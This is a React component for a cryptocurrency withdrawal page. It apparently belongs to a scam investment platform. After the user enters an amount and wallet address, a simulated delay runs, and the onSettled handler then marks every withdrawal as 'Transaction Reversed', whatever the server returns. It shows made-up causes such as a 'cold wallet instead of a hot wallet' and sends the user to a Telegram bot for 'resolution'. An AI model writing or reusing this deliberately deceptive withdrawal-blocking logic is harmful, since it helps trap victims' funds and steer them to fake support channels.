import { useState, useEffect } from "react";
import { useGetBalance, useGetCryptoRates, useCreateWithdraw } from "@workspace/api-client-react";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ShieldAlert, AlertTriangle, ArrowRight, Loader2, Info } from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";

export default function Withdraw() {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState("");
  const [crypto, setCrypto] = useState("");
  const [wallet, setWallet] = useState("");
  const [processingState, setProcessingState] = useState<"idle" | "processing" | "reversed">("idle");
  
  const { data: balance, isLoading: loadingBalance } = useGetBalance();
  const { data: rates, isLoading: loadingRates } = useGetCryptoRates();
  const createWithdraw = useCreateWithdraw();
  const { toast } = useToast();

  const handleIdentityConfirm = () => setStep(2);
  const handleIdentityDecline = () => {
    toast({ title: "Verification Required", description: "Identity verification is mandatory for withdrawals.", variant: "destructive" });
  };

  const handleAmountSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!balance) return;
    const numAmount = Number(amount);
    if (numAmount > balance.withdrawableBalance) {
      toast({ title: "Insufficient Funds", description: "Amount exceeds withdrawable balance.", variant: "destructive" });
      return;
    }
    setStep(3);
  };

  const handleCryptoSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!crypto) {
      toast({ title: "Select Currency", description: "Please select a withdrawal currency.", variant: "destructive" });
      return;
    }
    setStep(4);
  };

  const handleWalletSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!wallet) return;
    setStep(5);
    setProcessingState("processing");
    
    // Simulate processing
    setTimeout(() => {
      createWithdraw.mutate({ data: { amount: Number(amount), crypto, walletAddress: wallet } }, {
        onSettled: () => {
          setProcessingState("reversed");
        }
      });
    }, 3000);
  };

  if (loadingBalance || loadingRates) return <div className="flex justify-center p-8"><Loader2 className="h-8 w-8 animate-spin text-primary" /></div>;

  return (
    <div className="max-w-2xl mx-auto space-y-8">
      <div>
        <h1 className="text-3xl font-sans font-bold">Capital Withdrawal</h1>
        <p className="text-muted-foreground">Transfer funds to your external wallet.</p>
      </div>

      <div className="flex gap-2 mb-8">
        {[1, 2, 3, 4, 5].map((s) => (
          <div key={s} className={`h-1 flex-1 rounded-full ${s <= step ? 'bg-primary' : 'bg-muted'}`} />
        ))}
      </div>

      {step === 1 && (
        <Card className="bg-card/50 border-border">
          <CardHeader>
            <div className="flex items-center gap-2 mb-2">
              <ShieldAlert className="h-5 w-5 text-amber-500" />
              <CardTitle>Security Check</CardTitle>
            </div>
            <CardDescription>Please confirm your Identity before you can withdraw your funds.</CardDescription>
          </CardHeader>
          <CardFooter className="flex justify-end gap-4">
            <Button variant="outline" onClick={handleIdentityDecline}>Decline</Button>
            <Button onClick={handleIdentityConfirm}>Proceed</Button>
          </CardFooter>
        </Card>
      )}

      {step === 2 && (
        <Card className="bg-card/50 border-border">
          <CardHeader>
            <CardTitle>Withdrawal Amount</CardTitle>
            <CardDescription>Available to withdraw: <span className="font-mono text-emerald-400">${balance?.withdrawableBalance.toFixed(2)}</span></CardDescription>
          </CardHeader>
          <CardContent>
            <form id="amount-form" onSubmit={handleAmountSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label>How much would you like to withdraw?</Label>
                <Input 
                  type="number" 
                  value={amount} 
                  onChange={e => setAmount(e.target.value)} 
                  required 
                  min="10" 
                  max={balance?.withdrawableBalance}
                  className="font-mono text-lg bg-black/50" 
                />
              </div>
            </form>
          </CardContent>
          <CardFooter className="flex justify-between">
            <Button variant="ghost" onClick={() => setStep(1)}>Back</Button>
            <Button form="amount-form" type="submit">Next <ArrowRight className="ml-2 h-4 w-4" /></Button>
          </CardFooter>
        </Card>
      )}

      {step === 3 && (
        <Card className="bg-card/50 border-border">
          <CardHeader>
            <CardTitle>Select Asset</CardTitle>
            <CardDescription>Choose the cryptocurrency for withdrawal</CardDescription>
          </CardHeader>
          <CardContent>
            <form id="crypto-form" onSubmit={handleCryptoSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label>Cryptocurrency</Label>
                <Select value={crypto} onValueChange={setCrypto} required>
                  <SelectTrigger className="bg-black/50">
                    <SelectValue placeholder="Select network" />
                  </SelectTrigger>
                  <SelectContent>
                    {rates?.map(rate => (
                      <SelectItem key={rate.symbol} value={rate.symbol}>
                        {rate.name} ({rate.symbol}) - Rate: ${rate.usdRate.toLocaleString()}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </form>
          </CardContent>
          <CardFooter className="flex justify-between">
            <Button variant="ghost" onClick={() => setStep(2)}>Back</Button>
            <Button form="crypto-form" type="submit">Next <ArrowRight className="ml-2 h-4 w-4" /></Button>
          </CardFooter>
        </Card>
      )}

      {step === 4 && (
        <Card className="bg-card/50 border-border">
          <CardHeader>
            <CardTitle>Destination Address</CardTitle>
            <CardDescription>Enter your {crypto} wallet address</CardDescription>
          </CardHeader>
          <CardContent>
            <form id="wallet-form" onSubmit={handleWalletSubmit} className="space-y-4">
              <div className="bg-amber-500/10 border border-amber-500/20 p-4 rounded-md flex gap-3 text-sm text-amber-500/90 mb-4">
                <AlertTriangle className="h-5 w-5 shrink-0" />
                <p>Ensure this is a valid {crypto} address. Transfers to incorrect networks cannot be recovered.</p>
              </div>
              <div className="space-y-2">
                <Label>Wallet Address</Label>
                <Input 
                  value={wallet} 
                  onChange={e => setWallet(e.target.value)} 
                  required 
                  placeholder="Enter address..." 
                  className="font-mono bg-black/50" 
                />
              </div>
            </form>
          </CardContent>
          <CardFooter className="flex justify-between">
            <Button variant="ghost" onClick={() => setStep(3)}>Back</Button>
            <Button form="wallet-form" type="submit">Initiate Transfer</Button>
          </CardFooter>
        </Card>
      )}

      {step === 5 && (
        <Card className="bg-card/50 border-border text-center py-8">
          <CardContent className="space-y-6">
            {processingState === "processing" && (
              <>
                <div className="flex justify-center">
                  <div className="h-20 w-20 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
                </div>
                <div className="space-y-2">
                  <h3 className="text-xl font-bold font-sans">Processing Transaction</h3>
                  <p className="text-muted-foreground">Validating compliance checks and network conditions...</p>
                </div>
              </>
            )}
            
            {processingState === "reversed" && (
              <>
                <div className="flex justify-center">
                  <div className="h-20 w-20 rounded-full bg-rose-500/10 flex items-center justify-center">
                    <ShieldAlert className="h-10 w-10 text-rose-500" />
                  </div>
                </div>
                <div className="space-y-4">
                  <h3 className="text-xl font-bold font-sans text-rose-500">Transaction Reversed</h3>
                  <div className="bg-black/50 border border-border p-4 rounded-md text-left text-sm text-muted-foreground space-y-2 max-w-md mx-auto">
                    <p className="font-semibold text-foreground">Withdrawal flagged by automated security systems.</p>
                    <p>Possible causes:</p>
                    <ul className="list-disc pl-5 space-y-1">
                      <li>Destination identified as a cold wallet instead of a hot wallet</li>
                      <li>Incomplete KYC/AML verification tier</li>
                      <li>Unusual withdrawal pattern detected</li>
                    </ul>
                  </div>
                  <div className="bg-primary/10 text-primary p-4 rounded-md max-w-md mx-auto inline-flex items-center gap-2 text-sm">
                    <Info className="h-4 w-4" />
                    <span>Please contact <a href="https://t.me/AverAssistancebot" target="_blank" rel="noreferrer" className="font-bold hover:underline">@AverAssistancebot</a> for resolution.</span>
                  </div>
                </div>
                <Button variant="outline" onClick={() => setStep(1)} className="mt-4">Return to Start</Button>
              </>
            )}
          </CardContent>
        </Card>
      )}
    </div>
  );
}